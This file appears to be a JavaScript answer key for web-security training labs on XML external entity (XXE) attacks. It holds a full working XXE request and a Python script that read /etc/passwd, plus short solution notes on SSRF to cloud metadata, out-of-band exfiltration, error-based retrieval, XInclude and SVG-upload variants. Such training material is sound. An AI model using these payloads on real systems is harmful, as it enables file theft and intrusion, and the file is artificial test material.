export default {
  'xxe-lab-exploiting-xxe-to-retrieve-files': {
    note: 'The stock-check XML body is parsed with external entities enabled; define an entity for `/etc/passwd` and reference it.',
    work: {
      hints: [
        'The stock-check request sends XML. Add a `DOCTYPE` before the root element; the parser will process it.',
        'Define `<!ENTITY xxe SYSTEM "file:///etc/passwd">` inside the DTD, then replace the product id with `&xxe;`.',
        'Send the document and read the file contents where the product id would normally be echoed.'
      ],
      approach:
        'The XML parser resolves the external entity at parse time and substitutes the file contents into the document. The application then reflects the parsed value in its response, turning the parser into a file-read primitive.',
      request: `POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/xml
Cookie: session=YOUR-SESSION

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>`,
      tokens: [
        ['<!DOCTYPE stockCheck', 'Declares a DTD for the root element. Without it, no entity can be defined.'],
        ['<!ENTITY xxe', 'Defines a general entity named `xxe`; the name is arbitrary.'],
        ['SYSTEM "file:///etc/passwd"', 'Tells the parser to resolve the entity from the local filesystem.'],
        ['&xxe;', 'The reference that triggers resolution and inserts the file contents.'],
        ['<productId>', 'A reflected field: the parsed value is returned in the response, making the read in-band.']
      ],
      script: `import sys, requests

host = sys.argv[1]
body = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>"""
r = requests.post(f"https://{host}/product/stock", data=body,
                  headers={"Content-Type": "application/xml"}, timeout=20)
print(r.status_code)
print("root:" in r.text and "file read" or r.text[:300])`
    }
  },
  'xxe-lab-exploiting-xxe-to-perform-ssrf': {
    note: 'Point the entity at the cloud metadata URL; the parser fetches it and the response reveals the IAM role name.'
  },
  'xxe-lab-xxe-with-out-of-band-interaction': {
    note: 'The parsed value is not reflected; define an external entity pointing at a Collaborator URL to prove resolution.'
  },
  'xxe-lab-xxe-with-out-of-band-interaction-using-parameter-entities': {
    note: 'General entities are blocked or unused; declare a parameter entity with `%` and force its expansion inside the DTD.'
  },
  'xxe-lab-xxe-with-out-of-band-exfiltration': {
    note: 'Host an external DTD that reads a file into a parameter entity and embeds it in a second request to your server.'
  },
  'xxe-lab-xxe-with-data-retrieval-via-error-messages': {
    note: 'Outbound HTTP is blocked; craft an external DTD that causes a parse error containing the file contents.'
  },
  'xxe-lab-xinclude-attack': {
    note: 'The application embeds your input into server-side XML; use `<xi:include parse="text" href="file:///...">` with the XInclude namespace.'
  },
  'xxe-lab-xxe-via-file-upload': {
    note: 'Avatar uploads accept SVG, which is XML; embed an entity in the SVG and reference it in a text node.'
  },
  'xxe-lab-xxe-trigger-error-message-by-repurposing-local-dtd': {
    note: 'External DTDs are blocked; repurpose a local DTD file and redefine an entity to trigger an error containing the file.'
  }
}
